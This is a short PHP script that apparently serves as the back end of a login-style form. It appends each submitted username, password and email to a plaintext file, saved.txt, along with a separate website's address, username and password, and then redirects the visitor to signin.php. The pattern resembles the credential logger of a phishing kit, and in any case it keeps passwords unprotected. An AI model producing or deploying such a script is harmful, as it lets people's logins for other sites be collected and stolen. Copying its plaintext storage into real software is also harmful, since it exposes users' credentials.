<?php

if(isset($_POST['submit_2'])){
$Name = "Username:".$_POST["username"]."
";
$Pass = "Password:".$_POST["password"]."
";
$Email = "Email:".$_POST["email"]."
";
$WebsiteAddresse = "WebsiteAddresse:".$_POST["weburl"]."
";
$Webusername = "Webusername:".$_POST["webusername"]."
";
$Webpassword = "Webpassword:".$_POST["webpassword"]."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fwrite($file, $Email);
fwrite($file, $WebsiteAddresse);
fwrite($file, $Webusername);
fwrite($file, $Webpassword);
fclose($file);
}
header("location: signin.php ");
?>
